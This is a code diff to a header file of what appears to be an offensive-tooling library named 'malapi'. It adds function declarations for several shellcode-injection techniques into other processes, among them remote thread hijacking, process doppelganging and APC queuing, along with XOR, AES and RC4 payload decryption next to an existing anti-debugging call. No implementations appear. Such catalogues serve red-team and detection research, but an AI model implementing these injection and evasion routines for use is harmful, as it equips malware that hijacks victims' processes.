@@ -2116,10 +2116,56 @@ namespace malapi
 	//
 	VOID HideFromDebugger(_In_ HANDLE ThreadHandle = (HANDLE)-2);
 
+	////////////////////////////////////////////////////
+	//
+	// Injection Techniques
+	//
+
 	//
 	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
 	//
-	BOOL InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength);
+	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Process Injection
+	//
+	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Remote Thread Hijacking
+	//
+	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// InjectionAddressOfEntryPoint Injection
+	//
+	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Process InjectionDoppleganger
+	//
+	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// QueueUserApc Injection
+	//
+	BOOL InjectionQueueUserAPC(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	////////////////////////////////////////////////////
+	//
+	// Decryption
+	//
+
+	VOID NONE(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+
+	//
+	// XORs input with a given key, will repeat the key if KeyLen < InputLen.
+	//
+	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+
+	VOID AES(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+
+	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
 	//
 	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
